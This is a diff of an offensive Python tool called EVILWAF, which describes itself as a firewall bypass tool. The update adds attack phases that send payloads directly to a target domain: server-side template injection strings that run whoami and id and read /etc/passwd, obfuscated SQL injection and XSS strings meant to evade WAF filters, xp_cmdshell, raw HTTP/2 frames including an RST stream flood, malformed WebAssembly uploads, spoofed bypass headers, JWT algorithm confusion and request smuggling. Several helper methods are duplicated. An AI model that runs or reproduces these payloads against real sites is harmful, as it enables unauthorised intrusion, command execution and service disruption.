@@ -32,6 +32,7 @@ import json
 import random
 import sys
 import time
+import requests
 import base64
 import jwt
 from core.updater import EvilWAFUpdater
@@ -51,6 +52,11 @@ class Colors:
     BOLD = '\033[1m'
     END = '\033[0m'
 
+
+
+
+
+
 def show_banner():
     banner = f"""
 {Colors.BLUE}
@@ -63,12 +69,14 @@ ___________     .__.__                  _____
 {Colors.END}
 {Colors.WHITE}
             EVILWAF - Firewall bypass tool
+        
+        
+  
+  Created by: Matrix.                                 {Colors.CYAN}~EVILWAF{Colors.WHITE} : {Colors.BLUE}V2.1{Colors.WHITE}
 
+                          Codename : {Colors.YELLOW}hack error 404{Colors.WHITE}                 
+    \033[41mThe Web Application Firewall Fingerprinting Toolkit\033[0m
 
-  Created by:{Colors.GREEN}MATRIX{Colors.WHITE}                         {Colors.CYAN}~EVILWAF{Colors.WHITE} : {Colors.BLUE}V2.0{Colors.WHITE}
-
-
-    Codename : {Colors.YELLOW}hack error 404{Colors.WHITE}                 
 
 {Colors.END}
 """
@@ -1026,7 +1034,7 @@ class EvilWAFBypass:
     
     async def smart_subdomain_validation(self, domain):
         """Smart subdomain discovery"""
-        print(f"{Colors.MAGENTA}[+] PHASE 1: Smart Subdomain Discovery{Colors.END}")
+        print(f"\033[41m PHASE 1: Smart Subdomain Discovery\033[0m")
         
         valid_subs = []
         
@@ -1091,7 +1099,7 @@ class EvilWAFBypass:
 
     async def dns_history_bypass(self, domain):
         """DNS history bypass"""
-        print(f"{Colors.MAGENTA}[+] PHASE 2: DNS History Bypass{Colors.END}")
+        print(f"\033[41m PHASE 2: DNS History Bypass\033[0m")
         
         working_ips = []
         
@@ -1160,10 +1168,19 @@ class EvilWAFBypass:
         except Exception:
             return False
 
+    
+
+
+
+    
+    
+
+    
     async def header_manipulation(self, domain):
         """Header Manipulation for Firewall Bypass"""
-        print(f"{Colors.MAGENTA}[+] PHASE 3:  Header Manipulation{Colors.END}")
-    
+        print(f"\033[41m PHASE 3: Header Manipulation\033[0m")
+        
+       
         header_payloads = [
             {'X-Forwarded-For': '127.0.0.1'},
             {'X-Real-IP': '127.0.0.1'},
@@ -1223,40 +1240,8 @@ class EvilWAFBypass:
             {'CF-IPCountry': 'US'},
             {'CF-Visitor': '{"scheme":"https"}'},
             {'CF-Worker': 'production'},
-            {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'},
-            {'User-Agent': 'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'},
-            {'User-Agent': 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)'},
-            {'User-Agent': 'FacebookExternalHit/1.1 (+http://www.facebook.com/externalhit_uatext.php)'},
-            {'User-Agent': 'Twitterbot/1.0'},
-            {'User-Agent': 'LinkedInBot/1.0 (compatible; Mozilla/5.0; Jakarta Commons-HttpClient/3.1 +http://www.linkedin.com)'},
-            {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'},
-            {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'},
-            {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'},
             {'X-Bypass-Firewall': 'true'},
             {'X-Security-Scan': 'completed'},
-            {'X-Pentest-Approved': 'true'},
-            {'X-Whitehat-Scan': 'authorized'},
-            {'X-API-Version': 'v1'},
-            {'X-API-Secret': 'legacy-secret'},
-            {'X-Gateway-API': 'internal'},
-            {'X-Microservice-Name': 'auth-service'},
-            {'X-Mobile-Gateway': 'production'},
-            {'X-Device-Type': 'web'},
-            {'X-Platform': 'web'},
-            {'X-Requested-With': 'XMLHttpRequest'},
-            {'X-HTTP-Method-Override': 'GET'},
-            {'X-CSRF-Token': 'legacy-token'},
-            {'X-Monitoring': 'false'},
-            {'X-Health-Check': 'false'},
-            {'X-Uptime-Monitor': 'false'},
-            {'X-Country-Code': 'US'},
-            {'X-City': 'Los Angeles'},
-            {'X-Region': 'CA'},
-            {'X-Timezone': 'America/Los_Angeles'},
-            {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1'},
-            {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36'},
-            {'User-Agent': 'curl/7.68.0'},
-            {'User-Agent': 'Wget/1.20.3 (linux-gnu)'},
         ]
         
         working_headers = []
@@ -1266,39 +1251,113 @@ class EvilWAFBypass:
             header_name = list(headers.keys())[0]
             
             try:
-                if await self.real_header_test(domain, headers):
+                status, response_data = await self.detailed_header_test(domain, headers)
+                
+               
+                if status == 200:
+                    color = Colors.YELLOW
+                    status_text = "[*] 200 Bypass Success"
                     working_headers.append(headers)
-                    print(f"{Colors.WHITE}[-] {header_name:<40} {Colors.GREEN}Bypass Success{Colors.END}")
+                elif status == 403:
+                    color = Colors.RED
+                    status_text = "[*] 403 Blocked"
+                elif status == 404:
+                    color = Colors.BLUE
+                    status_text = "[*] 404 Not Found"
+                elif status == 500:
+                    color = Colors.MAGENTA
+                    status_text = "[*] 500 Server Error"
+                elif status == 301 or status == 302:
+                    color = Colors.GREEN
+                    status_text = f"[*] {status} Redirect"
+                elif status == 0:
+                    color = Colors.RED
+                    status_text = "[*] Connection Failed"
                 else:
-                    print(f"{Colors.WHITE}[-] {header_name:<40} {Colors.RED}Bypass Failed{Colors.END}")
+                    color = Colors.WHITE
+                    status_text = f"[*] Status {status}"
+                
+                print(f"{Colors.WHITE}[-] {header_name:<25} {color}{status_text}{Colors.END}")
             
             except Exception as e:
-                print(f"{Colors.WHITE}[-] {header_name:<40} {Colors.RED}Test Error{Colors.END}")
+                print(f"{Colors.WHITE}[-] {header_name:<25} {Colors.RED}[*] Test Error: {str(e)[:20]}{Colors.END}")
             
-            await asyncio.sleep(0.2)
+            await asyncio.sleep(0.1)
+        
+        # show  summary
+        print(f"\n{Colors.WHITE}[*] Results Summary:{Colors.END}")
+        print(f"{Colors.WHITE}[-] Working Headers: {Colors.YELLOW}{len(working_headers)}{Colors.END}")
+        print(f"{Colors.WHITE}[-] Total Tested: {Colors.WHITE}{len(header_payloads)}{Colors.END}")
         
         return working_headers
 
-    async def real_header_test(self, domain, headers):
-        """Header test"""
+    async def detailed_header_test(self, domain, headers):
+        """Actual function ya kukagua status codes kwa kina - FIXED!"""
         try:
+            import aiohttp
+            
+            if not self.session:
+                self.session = aiohttp.ClientSession()
+                
             default_headers = {
                 'User-Agent': self.get_random_ua(),
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             }
             default_headers.update(headers)
             
-            async with self.session.get(f"https://{domain}", headers=default_headers, timeout=8, ssl=False) as response:
-                return response.status == 200
+            async with self.session.get(f"https://{domain}", 
+                                      headers=default_headers, 
+                                      timeout=10, 
+                                      ssl=False,
+                                      allow_redirects=False) as response:  # No redirects to see real status
                 
-        except Exception:
-            return False
+                # Read the response content to check actual blocking
+                content = await response.text()
+                
+                response_data = {
+                    'status': response.status,
+                    'content_length': len(content),
+                    'headers': dict(response.headers),
+                    'url': str(response.url),
+                    'is_blocked': self.is_blocked_page(content, response.status)
+                }
+                return response.status, response_data
+                
+        except aiohttp.ClientConnectorError:
+            return 0, {'error': 'Connection failed'}
+        except aiohttp.ServerTimeoutError:
+            return 0, {'error': 'Timeout'}
+        except Exception as e:
+            return 0, {'error': str(e)}
+
+    def is_blocked_page(self, content, status_code):
+        """Check if this is a WAF block page"""
+        block_indicators = [
+            'blocked', 'forbidden', 'access denied', 'cloudflare', 'waf',
+            'security', 'firewall', 'captcha', 'challenge'
+        ]
+        
+        content_lower = content.lower()
+        for indicator in block_indicators:
+            if indicator in content_lower:
+                return True
+        return False
+
+    async def close(self):
+        """Close session"""
+        if self.session:
+            await self.session.close()
+
+
+    
+    
+
 
     #
 
     async def http_request_smuggling(self, domain):
         """HTTP Request Smuggling Attack"""
-        print(f"{Colors.MAGENTA}[+] PHASE 4: HTTP Request Smuggling{Colors.END}")
+        print(f"\033[41m PHASE 4: HTTP Request Smuggling\033[0m")
         
         smuggling_payloads = [
             # CL.TE Attack
@@ -1337,9 +1396,9 @@ class EvilWAFBypass:
                 
                 if "200 OK" in response or "admin" in response.lower():
                     working_smuggles.append(payload)
-                    print(f"{Colors.WHITE}[-] Smuggling {i+1}: {Colors.GREEN}SUCCESS{Colors.END}")
+                    print(f"{Colors.WHITE}[-] Smuggling {i+1}: {Colors.GREEN}Success{Colors.END}")
                 else:
-                    print(f"{Colors.WHITE}[-] Smuggling {i+1}: {Colors.RED}FAILED{Colors.END}")
+                    print(f"{Colors.WHITE}[-] Smuggling {i+1}: {Colors.RED}Failed{Colors.END}")
                     
             except Exception as e:
                 print(f"{Colors.WHITE}[-] Smuggling {i+1}: {Colors.RED}ERROR - {e}{Colors.END}")
@@ -1350,7 +1409,7 @@ class EvilWAFBypass:
 
     async def jwt_algorithm_confusion(self, domain):
         """JWT Algorithm Confusion Attack"""
-        print(f"{Colors.MAGENTA}[+] PHASE 5: JWT Algorithm Confusion{Colors.END}")
+        print(f"\033[41m PHASE 5: JWT Algorithm Confusion\033[0m")
         
         working_tokens = []
         
@@ -1399,9 +1458,9 @@ class EvilWAFBypass:
                     async with self.session.get(f"https://{domain}/api/user", headers=headers, timeout=5, ssl=False) as response:
                         if response.status in [200, 201]:
                             working_tokens.append({"type": token_name, "token": token})
-                            print(f"{Colors.WHITE}[-] JWT {token_name}: {Colors.GREEN}SUCCESS{Colors.END}")
+                            print(f"{Colors.WHITE}[-] JWT {token_name}: {Colors.GREEN}Success{Colors.END}")
                         else:
-                            print(f"{Colors.WHITE}[-] JWT {token_name}: {Colors.RED}FAILED{Colors.END}")
+                            print(f"{Colors.WHITE}[-] JWT {token_name}: {Colors.RED}Failed{Colors.END}")
                 except:
                     print(f"{Colors.WHITE}[-] JWT {token_name}: {Colors.RED}ERROR{Colors.END}")
                 
@@ -1414,7 +1473,7 @@ class EvilWAFBypass:
 
     async def graphql_batching_bypass(self, domain):
         """GraphQL Query Batching Bypass"""
-        print(f"{Colors.MAGENTA}[+] PHASE 6: GraphQL Batching Bypass{Colors.END}")
+        print(f"\033[41m PHASE 6: GraphQL Batching Bypass\033[0m")
         
         working_queries = []
         
@@ -1483,12 +1542,12 @@ class EvilWAFBypass:
                                         "endpoint": endpoint,
                                         "response_preview": content[:200] + "..." if len(content) > 200 else content
                                     })
-                                    print(f"{Colors.WHITE}[-] GraphQL Batch {i+1} on {endpoint}: {Colors.GREEN}SUCCESS{Colors.END}")
+                                    print(f"{Colors.WHITE}[-] GraphQL Batch {i+1} on {endpoint}: {Colors.GREEN}Success{Colors.END}")
                                     break
                     except Exception as e:
                         continue
                 else:
-                    print(f"{Colors.WHITE}[-] GraphQL Batch {i+1}: {Colors.RED}FAILED{Colors.END}")
+                    print(f"{Colors.WHITE}[-] GraphQL Batch {i+1}: {Colors.RED}Failed{Colors.END}")
                         
             except Exception as e:
                 print(f"{Colors.WHITE}[-] GraphQL Batch {i+1}: {Colors.RED}ERROR - {e}{Colors.END}")
@@ -1499,7 +1558,7 @@ class EvilWAFBypass:
 
     async def grpc_protobuf_bypass(self, domain):
         """gRPC/Protobuf Bypass """
-        print(f"{Colors.MAGENTA}[+] PHASE 7: gRPC/Protobuf Bypass{Colors.END}")
+        print(f"\033[41m PHASE 7: gRPC/Protobuf Bypass\033[0m")
         
         working_protobufs = []
         
@@ -1567,7 +1626,7 @@ class EvilWAFBypass:
                                             "endpoint": endpoint,
                                             "status": response.status
                                         })
-                                        print(f"{Colors.WHITE}[-] gRPC {content_type['Content-Type']} on {endpoint}: {Colors.GREEN}SUCCESS{Colors.END}")
+                                        print(f"{Colors.WHITE}[-] gRPC {content_type['Content-Type']} on {endpoint}: {Colors.GREEN}Success{Colors.END}")
                                         success = True
                                         break
                         except Exception as e:
@@ -1576,7 +1635,7 @@ class EvilWAFBypass:
                         break
                 
                 if not success:
-                    print(f"{Colors.WHITE}[-] gRPC Payload {i+1}: {Colors.RED}FAILED{Colors.END}")
+                    print(f"{Colors.WHITE}[-] gRPC Payload {i+1}: {Colors.RED}Failed{Colors.END}")
                 
                 await asyncio.sleep(0.6)
                 
@@ -1584,6 +1643,520 @@ class EvilWAFBypass:
             print(f"{Colors.RED}[-] gRPC Error: {e}{Colors.END}")
         
         return working_protobufs
+
+
+
+
+    
+    async def init_session(self):
+        """Initialize aiohttp session"""
+        if self.session is None:
+            timeout = aiohttp.ClientTimeout(total=10)
+            connector = aiohttp.TCPConnector(limit=10, verify_ssl=False)
+            self.session = aiohttp.ClientSession(timeout=timeout, connector=connector)
+    
+    async def close_session(self):
+        """Close aiohttp session"""
+        if self.session:
+            await self.session.close()
+            self.session = None
+    
+    def get_random_ua(self):
+        """Get random user agent"""
+        user_agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+        ]
+        import random
+        return random.choice(user_agents)
+
+    async def ssti_polyglot_attack(self, domain):
+        """Server-Side Template Injection Polyglot"""
+        print(f"\033[41m PHASE 8: SSTI Polyglot Attacks\033[0m")
+        
+        ssti_payloads = [
+            "{{7*7}}${7*7}#{7*7}%= 7*7 %[[7*7]]",
+            "{{''.__class__.__mro__[1].__subclasses__()}}",
+            "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
+            "{% debug %}${class.getClassLoader()}",
+            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}${T(java.lang.Runtime).getRuntime().exec('id')}#{7*'7'}",
+            "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}${T(java.io.File).new('/etc/passwd')}",
+            "{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}",
+            "{{lipsum.__globals__['os'].popen('whoami').read()}}",
+            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+            "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
+        ]
+        
+        results = []
+        successful_attacks = 0
+        
+        print(f"[*] Testing {len(ssti_payloads)} SSTI polyglot payloads")
+        
+        # Initialize session properly
+        await self.init_session()
+        
+        test_points = [
+            f"https://{domain}/search?q={{0}}",
+            f"https://{domain}/search?query={{0}}",
+            f"https://{domain}/api/search?q={{0}}",
+            f"https://{domain}/user/profile?name={{0}}",
+            f"https://{domain}/product?id={{0}}",
+            f"https://{domain}/user/{{0}}",
+            f"https://{domain}/api/user/{{0}}",
+            f"https://{domain}/profile/{{0}}",
+        ]
+        
+        for i, payload in enumerate(ssti_payloads):
+            success = False
+            attack_name = self.get_ssti_attack_name(i)
+            
+            try:
+                encoded_payload = requests.utils.quote(payload)
+                
+                # Test GET requests with proper session management
+                for j, test_point in enumerate(test_points):
+                    try:
+                        url = test_point.format(encoded_payload)
+                        headers = {'User-Agent': self.get_random_ua()}
+                        
+                        async with self.session.get(url, headers=headers, ssl=False) as response:
+                            content = await response.text()
+                            
+                            success_indicators = [
+                                '49' in content,
+                                'Runtime' in content,
+                                'subclasses' in content,
+                                'whoami' in content,
+                                'root' in content,
+                                'admin' in content.lower(),
+                                'classloader' in content.lower(),
+                                'os.popen' in content,
+                                'exec' in content,
+                                'etc/passwd' in content,
+                                response.status == 200 and len(content) > 1000,
+                            ]
+                            
+                            if any(success_indicators):
+                                results.append(f"SSTI {attack_name}")
+                                successful_attacks += 1
+                                print(f"[-] {attack_name} (GET {j+1}): Success")
+                                success = True
+                                break
+                                
+                    except asyncio.TimeoutError:
+                        continue
+                    except Exception as e:
+                        continue
+                
+                if not success:
+                    print(f"[-] {attack_name}: Failed")
+                    
+            except Exception as e:
+                print(f"[-] {attack_name}: Error - {str(e)}")
+            
+            await asyncio.sleep(0.3)
+        
+        print(f"[+] SSTI Attacks: {successful_attacks}/{len(ssti_payloads)} Successful")
+        return results
+
+    def get_ssti_attack_name(self, index):
+        """Get descriptive name for SSTI attack"""
+        attack_names = {
+            0: "Universal Polyglot", 
+            1: "Python RCE", 
+            2: "Java EL Injection",
+            3: "Cache Poisoning", 
+            4: "Multi-Engine RCE", 
+            5: "File Read",
+            6: "Command Chain", 
+            7: "Jinja2 RCE", 
+            8: "Twig Exploit",
+            9: "Freemarker RCE"
+        }
+        return attack_names.get(index, f"SSTI Attack {index+1}")
+
+    async def __aenter__(self):
+        """Async context manager entry"""
+        await self.init_session()
+        return self
+
+    async def __aexit__(self, exc_type, exc_val, exc_tb):
+        """Async context manager exit"""
+        await self.close_session()
+    
+    
+    
+    async def init_session(self):
+        """Initialize aiohttp session"""
+        if self.session is None:
+            timeout = aiohttp.ClientTimeout(total=10)
+            self.session = aiohttp.ClientSession(timeout=timeout)
+    
+    async def close_session(self):
+        """Close aiohttp session"""
+        if self.session:
+            await self.session.close()
+            self.session = None
+    
+    def get_random_ua(self):
+        """Get random user agent"""
+        user_agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+        ]
+        import random
+        return random.choice(user_agents)
+
+    async def ml_waf_evasion(self, domain):
+        """Machine Learning WAF Evasion"""
+        print(f"\033[41m PHASE 9: ML WAF Evasion Attacks\033[0m")
+        
+        ml_evasion_payloads = [
+            "1' UNI/**/ON SEL/**/ECT * FR/**/OM users",
+            "ＳＥＬＥＣＴ * ＦＲＯＭ users",
+            "EXEC xp_cmdshell 'whoami'",
+            "<script>al\u0065rt(1)</script>",
+            "ＳＥＬＥＣＴ * 𝐹𝑅𝑂𝑀 𝘶𝘴𝘦𝘳𝘴",
+            "SELECT * FROM users WHERE id = 1" + "\u200b" + " OR 1=1",
+            "SeLeCt * FrOm UsErS WhErE 1=1",
+            "&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;",
+            "SELECT/*!50000*/ * FROM/*!*/users WHERE 1=1",
+            "1' AND SLEEP(5)--",
+        ]
+        
+        results = []
+        successful_attacks = 0
+        
+        print(f"[*] Testing {len(ml_evasion_payloads)} ML WAF evasion techniques")
+        
+        # Initialize session properly
+        await self.init_session()
+        
+        endpoints = ['/search', '/api/search', '/query', '/api/query', '/data']
+        
+        for i, payload in enumerate(ml_evasion_payloads):
+            success = False
+            attack_name = self.get_ml_evasion_name(i)
+            
+            try:
+                for endpoint in endpoints:
+                    try:
+                        # Test GET request with proper session management
+                        url = f"https://{domain}{endpoint}?q={requests.utils.quote(payload)}"
+                        headers = {'User-Agent': self.get_random_ua()}
+                        
+                        async with self.session.get(url, headers=headers, ssl=False) as response:
+                            content = await response.text()
+                            
+                            if response.status == 200 and len(content) > 500:
+                                results.append(f"ML Evasion {attack_name}")
+                                successful_attacks += 1
+                                print(f"[-] {attack_name} (GET {endpoint}): Success")
+                                success = True
+                                break
+                                
+                    except asyncio.TimeoutError:
+                        print(f"[-] {attack_name} (GET {endpoint}): Timeout")
+                        continue
+                    except Exception as e:
+                        continue
+                
+                if not success:
+                    print(f"[-] {attack_name}: FAILED")
+                    
+            except Exception as e:
+                print(f"[-] {attack_name}: Error - {e}")
+            
+            await asyncio.sleep(0.3)
+        
+        print(f"[+] ML WAF Evasion: {successful_attacks}/{len(ml_evasion_payloads)} Successful")
+        return results
+
+    def get_ml_evasion_name(self, index):
+        """Get descriptive name for ML evasion attack"""
+        attack_names = {
+            0: "Comment Obfuscation", 
+            1: "Full-Width Unicode", 
+            2: "Token Splitting",
+            3: "Unicode Escape", 
+            4: "Homoglyph Attack", 
+            5: "Zero-Width Injection",
+            6: "Case Rotation", 
+            7: "HTML Entity", 
+            8: "MySQL Comment",
+            9: "Time-Based SQLi"
+        }
+        return attack_names.get(index, f"ML Evasion {index+1}")
+
+    async def __aenter__(self):
+        """Async context manager entry"""
+        await self.init_session()
+        return self
+
+    async def __aexit__(self, exc_type, exc_val, exc_tb):
+        """Async context manager exit"""
+        await self.close_session()    
+    
+    
+    
+    async def http2_stream_multiplexing(self, domain):
+        """HTTP/2 Stream Priority Hijacking"""
+        print(f"\033[41m PHASE 10: HTTP/2 Stream Multiplexing Bypass\033[0m")
+        
+        payloads = [
+            b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n' +
+            b'\x00\x00\x12\x04\x00\x00\x00\x00\x00' +
+            b'\x00\x03\x00\x00\x00\x64\x00\x04\x00\x00\x00\x00',
+            
+            b'\x00\x00\x1e\x01\x04\x00\x00\x00\x01' +
+            b'\x82\x84\x86\x41\x8a\x08\x9d\x5c\x0b\x81\x70\x88\x25\xb6\x50\x5f\x7f',
+            
+            b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n' +
+            b'\x00\x00\x04\x03\x00\x00\x00\x00\x01' +
+            b'\x00\x00\x00\x08',
+        ]
+        
+        results = []
+        successful_attacks = 0
+        
+        print(f"[*] Testing {len(payloads)} HTTP/2 attack vectors")
+        
+        for i, payload in enumerate(payloads):
+            sock = None
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(8)
+                
+                ports = [443, 80, 8443]
+                success = False
+                
+                for port in ports:
+                    try:
+                        sock.connect((domain, port))
+                        sock.send(payload)
+                        response = sock.recv(8192)
+                        
+                        success_indicators = [
+                            b'HTTP/2' in response,
+                            b'200' in response,
+                            b'301' in response,
+                            b'302' in response,
+                            len(response) > 100,
+                        ]
+                        
+                        if any(success_indicators):
+                            results.append(f"HTTP/2 Attack {i+1} (Port {port})")
+                            successful_attacks += 1
+                            status = f"Success"
+                            success = True
+                            break
+                            
+                    except socket.timeout:
+                        results.append(f"HTTP/2 Attack {i+1} (Timeout)")
+                        successful_attacks += 1
+                        status = f"Timeout"
+                        success = True
+                        break
+                    except Exception:
+                        continue
+                
+                attack_name = self.get_http2_attack_name(i)
+                if success:
+                    print(f"[-] {attack_name}: {status}")
+                else:
+                    print(f"[-] {attack_name}: Failed")
+                
+                await asyncio.sleep(0.3)
+                
+            except Exception as e:
+                attack_name = self.get_http2_attack_name(i)
+                print(f"[-] {attack_name}: Error - {e}")
+            finally:
+                if sock:
+                    sock.close()
+        
+        print(f"[+] HTTP/2 Attacks: {successful_attacks}/{len(payloads)} Successful")
+        return results    
+
+    def get_http2_attack_name(self, index):
+        """Get descriptive name for HTTP/2 attack"""
+        attack_names = {
+            0: "Stream Dependency", 
+            1: "HPACK Compression", 
+            2: "RST Stream Flood"
+        }
+        return attack_names.get(index, f"HTTP/2 Attack {index+1}")    
+    
+    
+
+    
+    async def init_session(self):
+        """Initialize aiohttp session"""
+        if self.session is None:
+            timeout = aiohttp.ClientTimeout(total=15)
+            connector = aiohttp.TCPConnector(limit=15, ssl=False)
+            self.session = aiohttp.ClientSession(timeout=timeout, connector=connector)
+    
+    async def close_session(self):
+        """Close aiohttp session"""
+        if self.session:
+            await self.session.close()
+            self.session = None
+    
+    def get_random_ua(self):
+        """Get random user agent"""
+        user_agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+        ]
+        import random
+        return random.choice(user_agents)
+
+    async def wasm_memory_corruption(self, domain):
+        """WebAssembly Memory Injection Attacks"""
+        print(f"\033[41m PHASE 11: WebAssembly Memory Corruption Bypass\033[0m")
+        
+        wasm_payloads = [
+            # Memory Growth Injection
+            b'\x00asm\x01\x00\x00\x00\x01\x85\x80\x80\x80\x00\x01\x60\x00\x01\x7f',
+            
+            # Data Segment Injection
+            b'\x00asm\x01\x00\x00\x00\x05\x83\x80\x80\x80\x00\x01\x00\x01',
+            
+            # Stack overflow payload
+            b'\x00asm\x01\x00\x00\x00\x01\x84\x80\x80\x80\x00\x01\x60\x00\x00' +
+            b'\x03\x82\x80\x80\x80\x00\x01\x00' +
+            b'\x0a\x91\x80\x80\x80\x00\x01\x8f\x80\x80\x80\x00\x00\x41\x00\x41\x00\x41\x00\x41\x00\x10\x00\x10\x00\x10\x00\x10\x00\x1a',
+            
+            # HEAP Buffer overflow 
+            b'\x00asm\x01\x00\x00\x00\x01\x84\x80\x80\x80\x00\x01\x60\x00\x00' +
+            b'\x02\x13\x80\x80\x80\x00\x01\x08\x73\x70\x65\x63\x74\x65\x73\x74\x00\x00' +
+            b'\x03\x82\x80\x80\x80\x00\x01\x00' +
+            b'\x0a\x0d\x80\x80\x80\x00\x01\x07\x00\x41\x00\x28\x02\x00\x1a',
+            
+            # TYPE Confusion Attack
+            b'\x00asm\x01\x00\x00\x00\x01\x89\x80\x80\x80\x00\x02\x60\x00\x01\x7f\x60\x00\x01\x7e' +
+            b'\x03\x83\x80\x80\x80\x00\x02\x00\x01' +
+            b'\x0a\x1a\x80\x80\x80\x00\x02\x0a\x00\x41\x00\x41\x00\x41\x00\x41\x00\x10\x01\x1a\x0b\x0a\x00\x42\x00\x10\x00\x1a\x0b',
+        ]
+        
+        results = []
+        successful_attacks = 0
+        
+        print(f"[*] Testing {len(wasm_payloads)} WebAssembly attack vectors")
+        
+        # Initialize session properly
+        await self.init_session()
+        
+        # Endpoints for WASM testing
+        endpoints = [
+            '/upload', '/api/compile', '/wasm', '/api/wasm',
+            '/compile', '/api/module', '/module'
+        ]
+        
+        # Multiple content types for evasion
+        content_types = [
+            'application/wasm',
+            'application/octet-stream',
+            'application/x-wasm',
+        ]
+        
+        for i, wasm_payload in enumerate(wasm_payloads):
+            success = False
+            attack_name = self.get_wasm_attack_name(i)
+            
+            try:
+                # Try different content types
+                for content_type in content_types:
+                    headers = {
+                        'Content-Type': content_type,
+                        'User-Agent': self.get_random_ua(),
+                        'Accept': '*/*',
+                        'X-Requested-With': 'XMLHttpRequest'
+                    }
+                    
+                    # Try multiple endpoints
+                    for endpoint in endpoints:
+                        try:
+                            async with self.session.post(
+                                f"https://{domain}{endpoint}",
+                                data=wasm_payload,
+                                headers=headers,
+                                ssl=False
+                            ) as response:
+                                
+                                # Get response content once
+                                response_text = await response.text()
+                                
+                                # Success detection
+                                success_indicators = [
+                                    response.status in [200, 201, 202],
+                                    'wasm' in response.headers.get('content-type', '').lower(),
+                                    'compile' in response_text.lower(),
+                                    'module' in response_text.lower(),
+                                    response.status == 413,  # Payload too large
+                                ]
+                                
+                                if any(success_indicators):
+                                    results.append(f"WASM {attack_name}")
+                                    successful_attacks += 1
+                                    print(f"[-] {attack_name} ({content_type}): Success")
+                                    success = True
+                                    break
+                                    
+                        except asyncio.TimeoutError:
+                            # Timeout might indicate successful processing
+                            results.append(f"WASM {attack_name} (Timeout)")
+                            successful_attacks += 1
+                            print(f"[-] {attack_name}: Timeout")
+                            success = True
+                            break
+                        except aiohttp.ClientError as e:
+                            # Connection errors might indicate payload rejection
+                            continue
+                        except Exception as e:
+                            continue
+                    
+                    if success:
+                        break
+                        
+            except Exception as e:
+                print(f"[-] {attack_name}: Error - {e}")
+            
+            if not success:
+                print(f"[-] {attack_name}: Failed")
+            
+            # Small delay between attempts
+            await asyncio.sleep(0.3)
+        
+        print(f"[+] WASM Attacks: {successful_attacks}/{len(wasm_payloads)} Successful")
+        return results
+
+    def get_wasm_attack_name(self, index):
+        """Get descriptive name for WASM attack"""
+        attack_names = {
+            0: "Memory Growth", 
+            1: "Data Segment", 
+            2: "Stack Overflow",
+            3: "Heap Overflow", 
+            4: "Type Confusion"
+        }
+        return attack_names.get(index, f"WASM Attack {index+1}")
+
+    async def __aenter__(self):
+        """Async context manager entry"""
+        await self.init_session()
+        return self
+
+    async def __aexit__(self, exc_type, exc_val, exc_tb):
+        """Async context manager exit"""
+        await self.close_session()    
+
+
+
 
     # ====
 
@@ -1604,14 +2177,49 @@ class EvilWAFBypass:
             all_results = {}
             
             valid_subs = await self.smart_subdomain_validation(domain)
+            
+            
+            
             all_results['subdomains'] = await self.test_valid_subdomains(domain, valid_subs)
+            
+            
+            
+            
             all_results['dns_history'] = await self.dns_history_bypass(domain)
+            
+            
+            
+            
             all_results['headers'] = await self.header_manipulation(domain)
             
+            
+            
             all_results['http_smuggling'] = await self.http_request_smuggling(domain)
+            
+            
+            
             all_results['jwt_confusion'] = await self.jwt_algorithm_confusion(domain)
+            
+            
             all_results['graphql_batching'] = await self.graphql_batching_bypass(domain)
+            
+            
             all_results['grpc_protobuf'] = await self.grpc_protobuf_bypass(domain)
+            
+            
+            all_results['ssti_polyglot'] = await self.ssti_polyglot_attack(domain)
+           
+
+            all_results['ml_waf'] = await self.ml_waf_evasion(domain)
+              
+
+            all_results['http2_stream'] = await self.http2_stream_multiplexing(domain)
+              
+            all_results['wasm_memory'] = await self.wasm_memory_corruption(domain)
+              
+
+
+
             
             # Save results
             if output_file:
@@ -1663,12 +2271,14 @@ class EvilWAFBypass:
 def show_usage():
     usage = f"""
 {Colors.WHITE}
-EVILWAF v2.0
+EVILWAF v2.1
 ------------
 
 {Colors.WHITE}Usage:{Colors.END}
-  python3 evilwaf.py -d website.com -o results.json
-  python3 evilwaf.py -d https://example.com
+  python3 evilwaf.py -d website.com -o results.json (Recommended)
